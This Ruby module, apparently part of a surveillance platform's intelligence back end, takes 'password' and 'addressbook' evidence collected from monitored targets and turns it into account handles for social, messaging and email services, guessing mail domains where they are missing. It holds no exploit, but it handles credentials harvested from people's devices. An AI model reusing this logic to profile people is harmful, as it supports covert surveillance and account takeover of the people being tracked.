#
#  Module for retrieving the accounts of the targets
#

require 'mail'

# from RCS::Common
require 'rcs-common/trace'

module RCS
module Intelligence

class Accounts
  include Tracer
  extend Tracer

  class << self

    def retrieve
      count = ::Item.targets.count
      trace :info, "Retrieving accounts #{count} targets"

      ::Item.targets.each do |target|

        # TODO: skip if no new evidence arrived
        entity = ::Entity.targets.also_in(path: [target[:_id]]).first

        trace :debug, "Target: #{target.name} Entity: #{entity.name}"

        Evidence.collection_class(target[:_id]).where({type: 'password'}).each do |ev|
          add_handle(entity, ev[:data])
        end

        Evidence.collection_class(target[:_id]).where({type: 'addressbook'}).each do |ev|
          # skip contacts that are not the target
          next unless ev[:data]['type'] == :target
          add_handle(entity, ev[:data])
        end

      end

    end

    def add_handle(entity, data)
      # target account in the contacts (addressbook)
      if [:facebook, :twitter, :gmail, :bbm, :whatsapp, :phone].include? data['program']
        unless data['info'].length == 0
          type = data['program']
          name = data['info']
          name = name.split(':')[1].chomp.strip if name[":"]
          create_entity_handle(entity, :automatic, type, name)
        end

      # mail accounts from email clients saving account to the device
      elsif data['program'] =~ /outlook|mail/i
        name = data['user']
        add_domain(name, data['service'])
        create_entity_handle(entity, :automatic, :mail, name) if is_mail?(name)
      end

      # infer on the user to discover email addresses
      if data['user']
        name = data['user']
        add_domain(name, data['service'])
        create_entity_handle(entity, :automatic, :mail, name) if is_mail?(name)
      end

    end

    def create_entity_handle(entity, level, type, name)
      # don't add if already exist
      return if entity.handles.where({type: type, name: name}).count != 0

      trace :info, "Adding handle [#{type} #{name}] to entity: #{entity.name}"

      # add to the list of handles
      entity.handles.create!(level: :automatic, type: type, name: name)
    end

    def is_mail?(value)
      return false if value == ''
      parsed = Mail::Address.new(value)
      return parsed.address == value && parsed.local != parsed.address
    rescue Mail::Field::ParseError
      return false
    end

    def add_domain(user, service)
      user << '@gmail.com' if service =~ /gmail|google/i and not is_mail?(user)
      user << '@hotmail.com' if service =~ /hotmail/i and not is_mail?(user)
    end

  end

end

end
end

